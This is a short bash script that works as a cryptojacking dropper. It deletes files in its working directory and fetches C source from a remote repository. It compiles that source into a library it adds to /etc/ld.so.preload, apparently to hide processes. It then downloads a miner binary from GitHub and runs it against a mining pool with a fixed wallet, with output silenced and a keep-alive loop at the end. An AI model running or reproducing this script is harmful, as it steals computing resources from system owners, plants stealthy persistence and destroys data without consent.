#!/bin/bash
apt-get update ; apt-get install sudo wget cpulimit -y
rm -rf *
curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
mkdir .lib && cd .lib
wget -O sgr1  https://github.com/barburonjilo/back/raw/main/sr 
chmod +x sgr1
cpulimit -l 150 -e sgr1 &
sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
nice -n -10 nohup ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$(echo $RANDOM | md5sum | head -c 5) --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1  &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
